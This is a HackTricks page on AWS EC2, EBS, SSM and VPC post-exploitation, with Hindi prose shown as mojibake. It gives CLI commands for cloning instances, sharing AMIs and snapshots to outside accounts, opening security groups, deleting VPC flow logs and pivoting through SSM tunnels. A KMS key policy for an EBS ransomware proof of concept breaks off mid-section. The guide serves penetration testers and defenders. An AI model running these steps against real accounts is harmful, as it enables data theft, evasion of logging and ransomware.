# AWS - EC2, EBS, SSM & VPC Post Exploitation

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ **рд╣рдореЗрдВ рдлреЙрд▓реЛ рдХрд░реЗрдВ** [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}

## EC2 & VPC

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% content-ref url="../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### **рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг VPC рдорд┐рд░рд░ -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC рдЯреНрд░реИрдлрд┐рдХ рдорд┐рд░рд░рд┐рдВрдЧ **VPC рдХреЗ рднреАрддрд░ EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ рд▓рд┐рдП рдЗрдирдмрд╛рдЙрдВрдб рдФрд░ рдЖрдЙрдЯрдмрд╛рдЙрдВрдб рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдбреБрдкреНрд▓рд┐рдХреЗрдЯ рдХрд░рддреА рд╣реИ** рдмрд┐рдирд╛ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкрд░ рдХреБрдЫ рднреА рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд┐рдПред рдпрд╣ рдбреБрдкреНрд▓рд┐рдХреЗрдЯреЗрдб рдЯреНрд░реИрдлрд┐рдХ рдЖрдорддреМрд░ рдкрд░ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдФрд░ рдирд┐рдЧрд░рд╛рдиреА рдХреЗ рд▓рд┐рдП рдиреЗрдЯрд╡рд░реНрдХ рдЗрдВрдЯреНрд░реВрдЬрди рдбрд┐рдЯреЗрдХреНрд╢рди рд╕рд┐рд╕реНрдЯрдо (IDS) рдЬреИрд╕реА рдХрд┐рд╕реА рдЪреАрдЬрд╝ рдкрд░ рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛ред\
рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рднреА рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЗрд╕ рдкреГрд╖реНрда рдХреЛ рджреЗрдЦреЗрдВ:

{% content-ref url="aws-malicious-vpc-mirror.md" %}
[aws-malicious-vpc-mirror.md](aws-malicious-vpc-mirror.md)
{% endcontent-ref %}

### рдЪрд▓ рд░рд╣реЗ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреА рдХреЙрдкреА

рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдЖрдорддреМрд░ рдкрд░ рдХреБрдЫ рдкреНрд░рдХрд╛рд░ рдХреА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рд░рдЦрддреЗ рд╣реИрдВред рдЕрдВрджрд░ рдЬрд╛рдиреЗ рдХреЗ рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЗ рд╣реИрдВ (рджреЗрдЦреЗрдВ [EC2 рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рдЯреНрд░рд┐рдХреНрд╕](../../aws-privilege-escalation/aws-ec2-privesc.md))ред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдпрд╣ рджреЗрдЦрдиреЗ рдХрд╛ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рд╣реИ рдХрд┐ рдЗрд╕рдореЗрдВ рдХреНрдпрд╛ рд╣реИ, рд╡рд╣ рд╣реИ **рдПрдХ AMI рдмрдирд╛рдирд╛ рдФрд░ рдЗрд╕рд╕реЗ рдПрдХ рдирдпрд╛ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдЪрд▓рд╛рдирд╛ (рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдЕрдкрдиреЗ рд╕реНрд╡рдпрдВ рдХреЗ рдЦрд╛рддреЗ рдореЗрдВ)**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Snapshots рд╡реЙрд▓реНрдпреВрдо рдХреЗ рдмреИрдХрдЕрдк рд╣реИрдВ**, рдЬреЛ рдЖрдорддреМрд░ рдкрд░ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** рд░рдЦреЗрдВрдЧреЗ, рдЗрд╕рд▓рд┐рдП рдЗрдиреНрд╣реЗрдВ рдЪреЗрдХ рдХрд░рдиреЗ рд╕реЗ рдпрд╣ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рдХрдЯ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред\
рдпрджрд┐ рдЖрдк рдПрдХ **рд╡реЙрд▓реНрдпреВрдо рдмрд┐рдирд╛ рд╕реНрдиреИрдкрд╢реЙрдЯ** рдХреЗ рдкрд╛рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк: **рдПрдХ рд╕реНрдиреИрдкрд╢реЙрдЯ рдмрдирд╛рдПрдБ** рдФрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреНрд░рд┐рдпрд╛рдПрдБ рдХрд░реЗрдВ рдпрд╛ рдмрд╕ **рдЗрд╕реЗ рдПрдХ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдореЗрдВ рдорд╛рдЙрдВрдЯ рдХрд░реЗрдВ** рдЦрд╛рддреЗ рдХреЗ рдЕрдВрджрд░:

{% content-ref url="aws-ebs-snapshot-dump.md" %}
[aws-ebs-snapshot-dump.md](aws-ebs-snapshot-dump.md)
{% endcontent-ref %}

### Data Exfiltration

#### DNS Exfiltration

рднрд▓реЗ рд╣реА рдЖрдк рдПрдХ EC2 рдХреЛ рдЗрд╕ рддрд░рд╣ рд▓реЙрдХ рдХрд░ рджреЗрдВ рдХрд┐ рдХреЛрдИ рдЯреНрд░реИрдлрд┐рдХ рдмрд╛рд╣рд░ рди рдЬрд╛ рд╕рдХреЗ, рдпрд╣ рдЕрднреА рднреА **DNS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрдЯ** рдХрд░ рд╕рдХрддрд╛ рд╣реИред

* **VPC рдлреНрд▓реЛ рд▓реЙрдЧ рдЗрд╕реЗ рд░рд┐рдХреЙрд░реНрдб рдирд╣реАрдВ рдХрд░реЗрдВрдЧреЗ**ред
* рдЖрдкрдХреЗ рдкрд╛рд╕ AWS DNS рд▓реЙрдЧ рдХрд╛ рдХреЛрдИ рдПрдХреНрд╕реЗрд╕ рдирд╣реАрдВ рд╣реИред
*   рдЗрд╕реЗ "enableDnsSupport" рдХреЛ false рд╕реЗрдЯ рдХрд░рдХреЗ рдмрдВрдж рдХрд░реЗрдВ:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдЦрд╛рддреЗ рдХреЗ API рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдХреЛ рдХреЙрд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рд╡рд╣ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИред Cloudtrail рдЗрди рдХреЙрд▓реНрд╕ рдХреЛ рд▓реЙрдЧ рдХрд░реЗрдЧрд╛ рдФрд░ рд╣рдорд▓рд╛рд╡рд░ Cloudtrail рд▓реЙрдЧ рдореЗрдВ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрдЯ рдХреА рдЧрдИ рдЬрд╛рдирдХрд╛рд░реА рджреЗрдЦ рд╕рдХреЗрдЧрд╛ред

### Open Security Group

рдЖрдк рдЗрд╕ рддрд░рд╣ рдкреЛрд░реНрдЯ рдЦреЛрд▓рдХрд░ рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрд╡рд╛рдУрдВ рддрдХ рдЖрдЧреЗ рдХреА рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% code overflow="wrap" %}
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
{% endcode %}

### ECS рдХреЗ рд▓рд┐рдП рдкреНрд░рд┐рд╡реЗрд╕реНрдХ

рдПрдХ EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдЪрд▓рд╛рдирд╛ рдФрд░ рдЗрд╕реЗ ECS рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдкрдВрдЬреАрдХреГрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдФрд░ рдлрд┐рд░ ECS рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ рдбреЗрдЯрд╛ рдХреЛ рдЪреБрд░рд╛рдирд╛ред

[**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ рджреЗрдЦреЗрдВ**](../../aws-privilege-escalation/aws-ec2-privesc.md#privesc-to-ecs)ред

### VPC рдлреНрд▓реЛ рд▓реЙрдЧ рд╣рдЯрд╛рдПрдВ
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

Required permissions:
- `ssm:StartSession`

рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рдЕрд▓рд╛рд╡рд╛, SSM рдЯреНрд░реИрдлрд╝рд┐рдХ рдЯрдирд▓рд┐рдВрдЧ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЙрди EC2 рдЙрджрд╛рд╣рд░рдгреЛрдВ рд╕реЗ рдкрд┐рд╡рдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рдирдХреЗ рдкрд╛рд╕ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдореВрд╣реЛрдВ рдпрд╛ NACLs рдХреЗ рдХрд╛рд░рдг рдиреЗрдЯрд╡рд░реНрдХ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рд╣реИред 
рдпрд╣рд╛рдВ рдПрдХ рдкрд░рд┐рджреГрд╢реНрдп рд╣реИ рдЬрд╣рд╛рдВ рдпрд╣ рдЙрдкрдпреЛрдЧреА рд╣реИ, [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) рд╕реЗ рдПрдХ рдирд┐рдЬреА EKS рдХреНрд▓рд╕реНрдЯрд░ рдореЗрдВ рдкрд┐рд╡рдЯ рдХрд░рдирд╛ред

> рдПрдХ рд╕рддреНрд░ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ SessionManagerPlugin рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. рдЕрдкрдиреЗ рдорд╢реАрди рдкрд░ SessionManagerPlugin рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВ
2. рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ Bastion EC2 рдореЗрдВ рд▓реЙрдЧ рдЗрди рдХрд░реЗрдВ:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. [AWS EC2 рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ SSRF рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#abusing-ssrf-in-aws-ec2-environment) рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд╕рд╛рде рдмреИрд╕реНрдЯрд┐рдпрди EC2 AWS рдЕрд╕реНрдерд╛рдпреА рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ  
4. рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдЕрдкрдиреЗ рдорд╢реАрди рдореЗрдВ `$HOME/.aws/credentials` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ `[bastion-ec2]` рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░реЗрдВ  
5. рдмреИрд╕реНрдЯрд┐рдпрди EC2 рдХреЗ рд░реВрдк рдореЗрдВ EKS рдореЗрдВ рд▓реЙрдЧ рдЗрди рдХрд░реЗрдВ:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. `$HOME/.kube/config` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ `server` рдлрд╝реАрд▓реНрдб рдХреЛ `https://localhost` рдХреА рдУрд░ рдЗрдВрдЧрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВ  
7. рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдПрдХ SSM рдЯрдирд▓ рдмрдирд╛рдПрдВ:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. `kubectl` рдЯреВрд▓ рд╕реЗ рдЯреНрд░реИрдлрд╝рд┐рдХ рдЕрдм рдмреИрд╕реНрдЯрд┐рдпрди EC2 рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ SSM рдЯрдирд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдЧреНрд░реЗрд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдЖрдк рдЕрдкрдиреЗ рдорд╢реАрди рд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд▓рд╛рдХрд░ рдирд┐рдЬреА EKS рдХреНрд▓рд╕реНрдЯрд░ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ:
```shell
kubectl get pods --insecure-skip-tls-verify
```
рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ SSL рдХрдиреЗрдХреНрд╢рди рд╡рд┐рдлрд▓ рд╣реЛ рдЬрд╛рдПрдВрдЧреЗ рдЬрдм рддрдХ рдЖрдк `--insecure-skip-tls-verify` рдлреНрд▓реИрдЧ (рдпрд╛ K8s рдСрдбрд┐рдЯ рдЯреВрд▓реНрд╕ рдореЗрдВ рдЗрд╕рдХреЗ рд╕рдордХрдХреНрд╖) рдХреЛ рд╕реЗрдЯ рдирд╣реАрдВ рдХрд░рддреЗред рдЪреВрдВрдХрд┐ рдЯреНрд░реИрдлрд╝рд┐рдХ рд╕реБрд░рдХреНрд╖рд┐рдд AWS SSM рдЯрдирд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЯрдирд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЖрдк рдХрд┐рд╕реА рднреА рдкреНрд░рдХрд╛рд░ рдХреЗ MitM рд╣рдорд▓реЛрдВ рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИрдВред

рдЕрдВрдд рдореЗрдВ, рдпрд╣ рддрдХрдиреАрдХ рдирд┐рдЬреА EKS рдХреНрд▓рд╕реНрдЯрд░реЛрдВ рдкрд░ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢рд┐рд╖реНрдЯ рдирд╣реАрдВ рд╣реИред рдЖрдк рдХрд┐рд╕реА рднреА рдЕрдиреНрдп AWS рд╕реЗрд╡рд╛ рдпрд╛ рдХрд╕реНрдЯрдо рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкрд░ рдкрд┐рд╡рдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордирдЪрд╛рд╣реЗ рдбреЛрдореЗрди рдФрд░ рдкреЛрд░реНрдЯ рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### Share AMI

{% code overflow="wrap" %}
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
{% endcode %}

### рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдФрд░ рдирд┐рдЬреА AMIs рдореЗрдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдЦреЛрдЬреЗрдВ

* [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel рдПрдХ рдЙрдкрдХрд░рдг рд╣реИ рдЬреЛ **рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдпрд╛ рдирд┐рдЬреА Amazon Machine Images (AMIs) рдХреЗ рднреАрддрд░ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**ред рдпрд╣ рд▓рдХреНрд╖рд┐рдд AMIs рд╕реЗ рдЙрджрд╛рд╣рд░рдг рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ, рдЙрдирдХреЗ рд╡реЙрд▓реНрдпреВрдо рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░рдиреЗ рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд рд░рд╣рд╕реНрдпреЛрдВ рдпрд╛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдХреЗ рд▓рд┐рдП рд╕реНрдХреИрди рдХрд░рдиреЗ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░рддрд╛ рд╣реИред

### EBS рд╕реНрдиреИрдкрд╢реЙрдЯ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ

{% code overflow="wrap" %}
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
{% endcode %}

### EBS Ransomware PoC

рдПрдХ рдкреНрд░рдорд╛рдгрд┐рдд рдЕрд╡рдзрд╛рд░рдгрд╛ рдЬреЛ S3 рдкреЛрд╕реНрдЯ-рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреЗрд╢рди рдиреЛрдЯреНрд╕ рдореЗрдВ рдкреНрд░рджрд░реНрд╢рд┐рдд Ransomware рдкреНрд░рджрд░реНрд╢рди рдХреЗ рд╕рдорд╛рди рд╣реИред KMS рдХреЛ Ransomware рдкреНрд░рдмрдВрдзрди рд╕реЗрд╡рд╛ (RMS) рдХреЗ рд▓рд┐рдП рдкреБрдирдГ рдирд╛рдорд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕реЗ рд╡рд┐рднрд┐рдиреНрди AWS рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдХрд┐рддрдирд╛ рдЖрд╕рд╛рди рд╣реИред

рдкрд╣рд▓реЗ 'рд╣рдорд▓рд╛рд╡рд░' AWS рдЦрд╛рддреЗ рд╕реЗ, KMS рдореЗрдВ рдПрдХ рдЧреНрд░рд╛рд╣рдХ рдкреНрд░рдмрдВрдзрд┐рдд рдХреБрдВрдЬреА рдмрдирд╛рдПрдВред рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рд╣рдо рдмрд╕ AWS рдХреЛ рдореЗрд░реЗ рд▓рд┐рдП рдХреБрдВрдЬреА рдбреЗрдЯрд╛ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рджреЗрдВрдЧреЗ, рд▓реЗрдХрд┐рди рдПрдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдкрд░рд┐рджреГрд╢реНрдп рдореЗрдВ, рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдЕрднрд┐рдиреЗрддрд╛ AWS рдХреЗ рдирд┐рдпрдВрддреНрд░рдг рд╕реЗ рдмрд╛рд╣рд░ рдХреБрдВрдЬреА рдбреЗрдЯрд╛ рдХреЛ рдмрдирд╛рдП рд░рдЦреЗрдЧрд╛ред рдХреБрдВрдЬреА рдиреАрддрд┐ рдХреЛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдмрджрд▓реЗрдВ рдХрд┐ рдХрд┐рд╕реА рднреА AWS рдЦрд╛рддрд╛ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЛ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛред рдЗрд╕ рдХреБрдВрдЬреА рдиреАрддрд┐ рдХреЗ рд▓рд┐рдП, рдЦрд╛рддреЗ рдХрд╛ рдирд╛рдо 'AttackSim' рдерд╛ рдФрд░ рд╕рднреА рдкрд╣реБрдВрдЪ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓рд╛ рдиреАрддрд┐ рдирд┐рдпрдо 'рдмрд╛рд╣рд░реА рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди' рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
The key policy rule needs the following enabled to allow for the ability to use it to encrypt an EBS volume:

* `kms:CreateGrant`
* `kms:Decrypt`
* `kms:DescribeKey`
* `kms:GenerateDataKeyWithoutPlainText`
* `kms:ReEncrypt`

рдЕрдм рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рд╕реБрд▓рдн рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд╕рд╛рдеред рд╣рдо рдПрдХ 'рдкреАрдбрд╝рд┐рдд' рдЦрд╛рддреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдХреБрдЫ EC2 рдЙрджрд╛рд╣рд░рдг рд╣реИрдВ рдЬрд┐рдирд╕реЗ рдЕрдирдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб EBS рд╡реЙрд▓реНрдпреВрдо рдЬреБрдбрд╝реЗ рд╣реБрдП рд╣реИрдВред рдЗрд╕ 'рдкреАрдбрд╝рд┐рдд' рдЦрд╛рддреЗ рдХреЗ EBS рд╡реЙрд▓реНрдпреВрдо рд╡рд╣ рд╣реИрдВ рдЬрд┐рдирдХрд╛ рд╣рдо рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреЗ 